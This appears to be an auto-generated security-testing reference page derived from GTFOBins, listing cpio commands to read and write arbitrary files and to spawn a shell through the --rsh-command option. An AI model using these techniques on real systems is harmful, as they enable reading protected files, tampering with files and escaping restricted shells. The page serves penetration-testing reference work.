---
parsed_by: focuslocust
source: commands
type: generated
---
# cpio Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## cpio

Tool page: [cpio](../../tools/linux/cpio.md)

### file-read

```text
echo /path/to/input-file | cpio -o
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
echo /path/to/input-file | cpio -dp .
cat path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -udp .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio` |
| Evidence | Function example preserved from source parser. |
